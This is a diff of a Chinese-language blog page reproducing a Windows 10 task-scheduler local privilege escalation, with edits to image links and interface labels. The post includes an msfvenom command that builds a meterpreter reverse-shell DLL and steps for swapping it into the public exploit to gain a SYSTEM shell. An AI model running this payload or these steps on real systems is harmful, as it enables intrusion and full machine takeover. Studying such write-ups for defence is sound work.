@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/Pxi3Q0.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/PxinoQ.md.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png">
-<meta property="og:image" content="https://s1.ax1x.com/2018/08/31/PvFjwF.md.png">
+<meta property="og:image" content="https://s1.ax1x.com/2018/09/01/PxiMJs.md.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/PxiQWn.md.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/PxiVL8.md.png">
@@ -26,7 +26,7 @@
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/Pxilzq.md.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/Pxi8yV.md.png">
 <meta property="og:image" content="https://s1.ax1x.com/2018/09/01/PxieeS.md.png">
-<meta property="og:updated_time" content="2018-09-01T08:49:33.594Z">
+<meta property="og:updated_time" content="2018-09-01T08:52:12.899Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="windows-提权0day-复现">
 <meta name="twitter:description" content="前言：  win10中任务调度服务导出的函数没有验证调用者的权限，任意权限的用户调用该函数可以获取系统敏感文件的写权限，进而提权。影响范围：windows10，windows server 2016昨天群里的基友们都复现了一遍也都成功了，也有基友在windows8实验了发现了也能提权成功。  正文准备工作：下载POC，windows 10 镜像，Process Explorer，CFFPOC：Gi">
@@ -78,7 +78,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/422926799">Projects</a></li>
+          <li><a href="http://github.com/422926799">Projectes</a></li>
          
           <li><a href="/Search">Search</a></li>
         
@@ -96,10 +96,10 @@
         <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
     </span>
     <br/>
     <div id="share" style="display: none">
@@ -163,7 +163,7 @@
 <p><img src="https://s1.ax1x.com/2018/09/01/Pximdg.jpg" alt="Pximdg.jpg" border="0"></p>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>准备工作：下载POC，windows 10 镜像，Process Explorer，CFF<br>POC：<a href="https://github.com/SandboxEscaper/randomrepo" target="_blank" rel="noopener">GitHub - SandboxEscaper/randomrepo: Repo for random stuff</a><br>windows10 ISO:msdn下载<br>Process Explorer：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer - Windows Sysinternals | Microsoft Docs</a><br>CFF:<a href="https://ntcore.com/?page_id=388" target="_blank" rel="noopener">Explorer Suite – NTCore</a></p>
 <p>首先打开一个notepad<br><img src="https://s1.ax1x.com/2018/09/01/Pxi3Q0.png" alt="Pxi3Q0.png" border="0"><br>并没有什么不同，执行<br><img src="https://s1.ax1x.com/2018/09/01/PxinoQ.md.png"><br>带有子进程conhost和notepad的cmd.exe已经生成为SYSTEM！</p>
-<h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/08/31/PvFjwF.md.png" alt=""><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png"></p>
+<h3 id="将其武器化"><a href="#将其武器化" class="headerlink" title="将其武器化"></a>将其武器化</h3><p>在kali执行 <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f dll &gt; ka.dll</code><br><img src="https://s1.ax1x.com/2018/08/31/PvFgQP.md.png" alt=""><br>移动到windows10<br><img src="https://s1.ax1x.com/2018/09/01/PxiMJs.md.png"><br>在CFF打开<code>ALPC-TaskSched-LPE.dll</code>替换其msf生成的dll，然后保存<br><img src="https://s1.ax1x.com/2018/09/01/PxiGLT.md.png"></p>
 <p><img src="https://s1.ax1x.com/2018/09/01/PxiQWn.md.png"><br>kali中执行监听命令<br><img src="https://s1.ax1x.com/2018/09/01/PxiVL8.md.png"><br>windows 10中执行<br><img src="https://s1.ax1x.com/2018/09/01/PxiEsf.md.png"><br>返回kali可以发现已经成功的反弹了一个meterpreter，并且是system权限<br><img src="https://s1.ax1x.com/2018/09/01/Pxilzq.md.png"></p>
 <p><img src="https://s1.ax1x.com/2018/09/01/Pxi8yV.md.png"></p>
 <p><img src="https://s1.ax1x.com/2018/09/01/PxieeS.md.png"></p>
@@ -188,7 +188,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/422926799">Projects</a></li>
+          <li><a href="http://github.com/422926799">Projectes</a></li>
          
           <li><a href="/Search">Search</a></li>
         
@@ -216,10 +216,10 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
     </div>
 
   </div>
@@ -240,7 +240,7 @@
          
           <li><a href="/archives/">Writing</a></li>
          
-          <li><a href="http://github.com/422926799">Projects</a></li>
+          <li><a href="http://github.com/422926799">Projectes</a></li>
          
           <li><a href="/Search">Search</a></li>
         
